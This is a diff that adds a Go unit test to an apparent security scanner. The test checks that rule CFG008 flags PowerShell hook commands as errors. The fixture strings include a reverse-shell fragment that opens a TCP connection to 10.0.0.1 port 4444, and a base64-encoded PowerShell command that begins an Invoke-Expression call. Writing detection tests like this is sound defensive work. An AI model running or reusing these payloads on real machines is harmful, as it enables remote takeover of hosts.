@@ -99,3 +99,15 @@ func TestCFG008_NoSettings_NoFinding(t *testing.T) {
 		t.Errorf("expected no finding when settings absent, got %d", len(f))
 	}
 }
+
+func TestCFG008_PowerShellReverseShell(t *testing.T) {
+	for _, cmd := range []string{
+		`powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)"`,
+		`powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA`,
+	} {
+		f := CFG008.Check(hookTarget(t, cmd))
+		if len(f) != 1 || f[0].Severity != finding.Error {
+			t.Errorf("expected 1 Error for %q, got %+v", cmd, f)
+		}
+	}
+}
